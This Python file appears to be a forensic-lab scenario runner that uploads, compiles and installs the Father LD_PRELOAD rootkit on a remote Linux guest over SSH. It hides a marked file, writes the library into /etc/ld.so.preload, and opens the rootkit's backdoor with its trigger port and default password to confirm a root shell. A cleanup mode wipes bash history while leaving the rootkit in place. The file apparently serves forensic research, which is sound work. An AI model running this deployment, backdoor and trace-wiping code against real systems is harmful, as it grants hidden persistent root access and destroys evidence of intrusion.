"""Explicit runner for the Father LD_PRELOAD scenario."""

from __future__ import annotations

import socket
import time
from pathlib import Path

import yaml

from orchestrator.core import console
from orchestrator.core.provenance import file_sha256
from orchestrator.core.ssh_client import SSHClient, TerminalCommandResult
from scenarios.command_log import append_record, log_command, utc_now

SCENARIO_ID = "userland_father_ldpreload"
CLEANUP_SCENARIO_ID = "userland_father_ldpreload_cleanup"
ROOT = Path(__file__).resolve().parent
ARCHIVE = ROOT / "files/father-upstream-4eb2712.tar"
LOCK = ROOT / "father.lock.yml"

REMOTE_ROOT = "/tmp/forensic-lab/father_ldpreload"
UPLOAD_PATH = "/tmp/father-upstream-4eb2712.tar"

# Father defaults
INSTALLED_LIBRARY = "/lib/selinux.so.3"
PRELOAD_CONFIG = "/etc/ld.so.preload"
SOURCE_PORT = 54321
SHELL_PASSWORD = b"lobster\0"
AUTHENTICATION_PROMPT = b"AUTHENTICATE:"
SHELL_MARKER = b"Enjoy the shell!"

# Only intentional Father customization
HIDDEN_PREFIX = "__malicious_"
HIDDEN_FILE_NAME = f"{HIDDEN_PREFIX}file"
LIST_HIDDEN_DIR = 'ls -la -- "$hidden_dir"'

COMMAND_GROUPS = (
    (
        "prepare and build",
        (
            f"root={REMOTE_ROOT}; "
            'source="$root/Father-4eb2712caf612a7dc55fd4f34ff5c72b74c7c332"; '
            'hidden_dir="$root/probe"',
            'mkdir -p "$hidden_dir"',
            f'tar -xf {UPLOAD_PATH} -C "$root"',
            f"sed -i 's|^#define STRING .*|#define STRING "
            f'"{HIDDEN_PREFIX}"|\' "$source/src/config.h"',
            'cd "$source" && make father',
        ),
    ),
    (
        "install and activate",
        (
            f'sudo -n install -m 0644 "$source/rk.so" {INSTALLED_LIBRARY}',
            f'touch "$hidden_dir/{HIDDEN_FILE_NAME}"',
            LIST_HIDDEN_DIR,
            f"printf '%s\\n' {INSTALLED_LIBRARY} " f"| sudo -n tee {PRELOAD_CONFIG}",
            "sudo -n systemctl restart ssh.service",
        ),
    ),
    (
        "validate behavior",
        (LIST_HIDDEN_DIR,),
    ),
)

CLEANUP_COMMANDS = (
    f'rm -f -- {UPLOAD_PATH} && rm -rf -- "$source"',
    f'test ! -e {UPLOAD_PATH} && test ! -e "$source" '
    f"&& test -e {PRELOAD_CONFIG} && test -e {INSTALLED_LIBRARY}",
    "history -c",
    'rm -f -- "${HISTFILE:-$HOME/.bash_history}"',
    "unset HISTFILE",
    'test ! -e "$HOME/.bash_history"',
)


def run_father(
    ssh: SSHClient,
    transcript_path: Path,
    *,
    command_log_path: Path,
    run_id: str,
    scenario_id: str,
) -> dict:
    """Run Father visibly in Bash, then validate its native accept-hook shell."""
    if scenario_id not in (SCENARIO_ID, CLEANUP_SCENARIO_ID):
        raise ValueError(f"Unsupported Father scenario: {scenario_id}")

    cleanup = scenario_id == CLEANUP_SCENARIO_ID
    transcript_path.touch()
    console.scope("HOST", "stage Father source")
    source = _verify_source(command_log_path, run_id, scenario_id)
    _upload_archive(ssh, command_log_path, run_id, scenario_id)

    terminal = ssh.open_terminal()
    results: list[TerminalCommandResult] = []
    command_index = 0
    identity: str | None = None

    def run_command(command: str) -> None:
        nonlocal command_index
        command_index += 1
        started_at = utc_now()
        try:
            result = terminal.run(command, timeout=180)
        except Exception as exc:
            log_command(
                command_log_path,
                run_id,
                scenario_id,
                command_index,
                command,
                started_at,
                status="failure",
                error=str(exc),
            )
            raise
        results.append(result)
        status = "success" if result.exit_code == 0 else "failure"
        log_command(
            command_log_path,
            run_id,
            scenario_id,
            command_index,
            command,
            started_at,
            status=status,
            result=result,
        )
        if result.exit_code != 0:
            raise RuntimeError(f"Father command exited {result.exit_code}: {command}")

    try:
        with terminal:
            for label, commands in COMMAND_GROUPS:
                console.scope("GUEST", label)
                for command in commands:
                    run_command(command)

            listings = [
                result.combined_output
                for result in results
                if result.command == LIST_HIDDEN_DIR
            ]
            if (
                len(listings) != 2
                or HIDDEN_FILE_NAME not in listings[0]
                or HIDDEN_FILE_NAME in listings[1]
            ):
                raise RuntimeError("Father did not hide the controlled file as expected")

            if cleanup:
                console.scope("HOST", "validate Father backdoor")
                identity = _validate_backdoor(
                    ssh,
                    command_log_path=command_log_path,
                    run_id=run_id,
                    scenario_id=scenario_id,
                )
                console.scope("GUEST", "cleanup treatment")
                for command in CLEANUP_COMMANDS:
                    run_command(command)
    finally:
        transcript_path.write_text(terminal.transcript, encoding="utf-8")

    if identity is None:
        console.scope("HOST", "validate Father backdoor")
        identity = _validate_backdoor(
            ssh,
            command_log_path=command_log_path,
            run_id=run_id,
            scenario_id=scenario_id,
        )

    facts = {
        "source": source,
        "installed_library_path": INSTALLED_LIBRARY,
        "preload_config_path": PRELOAD_CONFIG,
        "hidden_file_path": f"{REMOTE_ROOT}/probe/{HIDDEN_FILE_NAME}",
        "file_hiding_passed": True,
        "father_backdoor_passed": True,
        "backdoor_identity": identity,
        "trigger_source_port": SOURCE_PORT,
        "listener_service": "sshd",
        "listener_port": ssh.port,
    }
    if cleanup:
        facts["cleanup"] = {
            "performed": True,
            "archive_removed": True,
            "source_tree_removed": True,
            "history_file_removed": True,
            "preload_config_preserved": True,
            "installed_library_preserved": True,
        }
    return facts


def _verify_source(command_log_path: Path, run_id: str, scenario_id: str) -> dict:
    started_at = utc_now()
    try:
        lock = yaml.safe_load(LOCK.read_text(encoding="utf-8"))
        archive_hash = file_sha256(ARCHIVE)
        expected_hash = lock["retrieval"]["archive_sha256"]
        if archive_hash != expected_hash:
            raise RuntimeError(
                "Father archive SHA-256 mismatch: "
                f"expected {expected_hash}, got {archive_hash}"
            )
    except Exception as exc:
        append_record(
            command_log_path,
            {
                "run_id": run_id,
                "scenario_id": scenario_id,
                "step_id": "verify_father_source",
                "type": "host_verification",
                "status": "failure",
                "started_at": started_at,
                "ended_at": utc_now(),
                "error": str(exc),
            },
        )
        raise

    source = {
        "repository": lock["upstream"]["url"],
        "commit": lock["upstream"]["pinned_commit"],
        "archive_sha256": archive_hash,
    }
    append_record(
        command_log_path,
        {
            "run_id": run_id,
            "scenario_id": scenario_id,
            "step_id": "verify_father_source",
            "type": "host_verification",
            "status": "success",
            "source": source,
            "started_at": started_at,
            "ended_at": utc_now(),
        },
    )
    console.ok(f"Father source verified: {archive_hash}")
    return source


def _upload_archive(
    ssh: SSHClient,
    command_log_path: Path,
    run_id: str,
    scenario_id: str,
) -> None:
    started_at = utc_now()
    console.step(f"Uploading {ARCHIVE.name} to {UPLOAD_PATH}...")
    try:
        ssh.put(ARCHIVE, UPLOAD_PATH)
    except Exception as exc:
        append_record(
            command_log_path,
            {
                "run_id": run_id,
                "scenario_id": scenario_id,
                "step_id": "upload_father_source",
                "type": "upload",
                "source": str(ARCHIVE),
                "destination": UPLOAD_PATH,
                "status": "failure",
                "started_at": started_at,
                "ended_at": utc_now(),
                "error": str(exc),
            },
        )
        raise
    append_record(
        command_log_path,
        {
            "run_id": run_id,
            "scenario_id": scenario_id,
            "step_id": "upload_father_source",
            "type": "upload",
            "source": str(ARCHIVE),
            "destination": UPLOAD_PATH,
            "status": "success",
            "started_at": started_at,
            "ended_at": utc_now(),
        },
    )


def _validate_backdoor(
    ssh: SSHClient,
    *,
    command_log_path: Path,
    run_id: str,
    scenario_id: str,
) -> str:
    started_at = utc_now()
    response = bytearray()
    authentication_prompt_observed = False
    shell_marker_observed = False
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    deadline = time.monotonic() + 12
    console.step(
        f"Connecting to {ssh.host}:{ssh.port} from Father trigger port "
        f"{SOURCE_PORT}..."
    )
    try:
        client.bind(("", SOURCE_PORT))
        client.settimeout(max(0.001, deadline - time.monotonic()))
        client.connect((ssh.host, ssh.port))

        while AUTHENTICATION_PROMPT not in response and time.monotonic() < deadline:
            client.settimeout(max(0.001, deadline - time.monotonic()))
            chunk = client.recv(4096)
            if not chunk:
                break
            response.extend(chunk)
        if AUTHENTICATION_PROMPT not in response:
            raise RuntimeError("Father authentication prompt was not received")
        authentication_prompt_observed = True

        client.sendall(SHELL_PASSWORD)
        authentication_response_offset = len(response)
        while (
            SHELL_MARKER not in response[authentication_response_offset:]
            and time.monotonic() < deadline
        ):
            client.settimeout(max(0.001, deadline - time.monotonic()))
            chunk = client.recv(4096)
            if not chunk:
                break
            response.extend(chunk)
        if SHELL_MARKER not in response[authentication_response_offset:]:
            raise RuntimeError("Father shell marker was not received")
        shell_marker_observed = True

        client.sendall(b"id\n")
        identity_response_offset = len(response)
        while (
            b"uid=0(root)" not in response[identity_response_offset:]
            or b"gid=1337" not in response[identity_response_offset:]
        ) and time.monotonic() < deadline:
            client.settimeout(max(0.001, deadline - time.monotonic()))
            chunk = client.recv(4096)
            if not chunk:
                break
            response.extend(chunk)
        if (
            b"uid=0(root)" not in response[identity_response_offset:]
            or b"gid=1337" not in response[identity_response_offset:]
        ):
            raise RuntimeError("Father shell did not return the expected root identity")
        identity_response = response[identity_response_offset:].decode(errors="replace")
        identity = next(
            (
                line.strip().removeprefix("\x1b[0m")
                for line in identity_response.splitlines()
                if "uid=0(root)" in line and "gid=1337" in line
            ),
            None,
        )
        if identity is None:
            raise RuntimeError("Father shell identity could not be parsed")
    except (OSError, RuntimeError) as exc:
        record = {
            "run_id": run_id,
            "scenario_id": scenario_id,
            "step_id": "validate_father_backdoor",
            "type": "host_socket",
            "command": "id",
            "trigger_source_port": SOURCE_PORT,
            "destination_host": ssh.host,
            "destination_port": ssh.port,
            "authentication_prompt_observed": authentication_prompt_observed,
            "shell_marker_observed": shell_marker_observed,
            "status": "failure",
            "started_at": started_at,
            "ended_at": utc_now(),
            "error": str(exc),
        }
        if response:
            record["response_tail"] = response.decode(errors="replace")[-1200:]
        append_record(command_log_path, record)
        raise RuntimeError(f"Father backdoor validation failed: {exc}") from exc
    finally:
        client.close()

    append_record(
        command_log_path,
        {
            "run_id": run_id,
            "scenario_id": scenario_id,
            "step_id": "validate_father_backdoor",
            "type": "host_socket",
            "command": "id",
            "trigger_source_port": SOURCE_PORT,
            "destination_host": ssh.host,
            "destination_port": ssh.port,
            "authentication_prompt_observed": authentication_prompt_observed,
            "shell_marker_observed": shell_marker_observed,
            "identity": identity,
            "status": "success",
            "started_at": started_at,
            "ended_at": utc_now(),
        },
    )
    console.ok(f'Father shell opened: "{SHELL_MARKER.decode()}"')
    console.ok(f"Father shell identity: {identity}")
    return identity
